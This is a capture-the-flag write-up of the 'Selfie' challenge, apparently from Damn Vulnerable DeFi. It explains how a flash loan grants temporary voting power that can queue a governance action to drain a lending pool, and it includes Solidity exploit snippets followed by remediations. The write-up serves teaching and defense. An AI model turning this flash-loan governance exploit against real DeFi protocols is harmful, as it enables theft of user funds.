# 🪞 Selfie — Flash Loans Meet Governance Exploitation

**As always: try to solve the challenge yourself before reading on. Review the contracts, debug your ideas, and only then dig into the write-up.**

---

## 📜 Challenge Overview

> A new lending pool has launched! It offers flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.  
> What could go wrong, right?

You're given:
- A flash loan pool holding **1.5 million DVT tokens**
- A governance contract with a **2-day delay**
- No tokens in your balance

Your goal:  
**Drain all tokens from the pool into a designated recovery account.**

---

## 🧠 Exploit Strategy

At the heart of the exploit is a **governance system based on token snapshot voting**, and a **flash loan pool** that enables temporary control over a large token balance.

### 🔥 Core Idea: Flash Loan Voting Power

Here’s the catch:
- The governance contract checks voting power at the time of action **queueing**
- But doesn’t check whether that voting power is **held long-term**
- So if we can **temporarily hold enough tokens** via a flash loan and delegate them, we can **queue any governance action**
- After 2 days, we can **execute it**, even if our voting power is gone

That’s a textbook case of **"flash loan governance attack"**

---

## 🔍 Vulnerable Logic

Let’s look at the critical parts:

### 🏛️ Governance check

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

✅ This check happens when queuing an action
❌ It doesn’t verify that tokens were held for any period
❌ Nor does it check whether tokens were obtained via flash loan

## ⚙️ Exploit Walkthrough

### Step 1: Flash Loan All Tokens

We request a flash loan of all 1.5M tokens from the SelfiePool.

### Step 2: Delegate Voting Power

In the same transaction, we call:
```solidity
token.delegate(address(this));
```

This gives us full voting power — but only temporarily.

### Step 3: Queue Malicious Governance Action

We craft a payload:
```solidity
abi.encodeWithSignature("emergencyExit(address)", player);
```

And queue it via:

```solidity
governance.queueAction(address(pool), 0, data);
```

This schedules a call that, after a 2-day delay, will transfer all tokens from the pool to our account.

### Step 4: Wait 2 Days

We warp forward in time using:
```solidity
vm.warp(block.timestamp + 2 days);
```

### Step 5: Execute Action

We call:
```solidity
governance.executeAction(actionId);
```

This triggers the emergencyExit(...), draining the pool to us.

## 💥 Exploit Snippet

```solidity
function onFlashLoan(...) external override returns (bytes32) {
    token.approve(address(pool), token.balanceOf(address(this)));
    token.delegate(address(this));
    actionID = governance.queueAction(address(pool), 0, data);
    return CALLBACK_SUCCESS;
}
```

Then in the main test:

```solidity
pool.flashLoan(receiver, address(token), TOKENS_IN_POOL, "");
vm.warp(2 days);
governance.executeAction(receiver.getActionID());
token.transfer(recovery, TOKENS_IN_POOL);
````

## 🧱 Root Cause

The system trusts delegated voting power at face value. By not anchoring voting to historical snapshots or token holding durations, governance becomes vulnerable to flash loan manipulation.

## ✅ Remediations

1. Use Snapshot-Based Voting
Lock in voting power at the block when the proposal is created.
2. Require Token Holding Duration
Enforce a minimum holding period before voting eligibility.
3. Prevent Flash Loan Voting
Track token transfers + flash loan detection to ignore temporary holdings.
4. Separate Governance Token from Liquidity Token
Use a different token for governance to avoid entanglement with pooled assets.

## 🧠 Final Thoughts

This is a classic flash loan governance bug — reminiscent of real-world DeFi attacks like those against Beethoven X or DAO Maker. It demonstrates why temporal ownership matters, especially in voting-based systems.

Designing secure governance requires:
- Thinking adversarially
- Considering token mobility
- Avoiding reliance on “now” as a source of truth

Flash loans continue to be a powerful tool — for both legitimate use and for exploitation.

Stay sharp. 👀

---
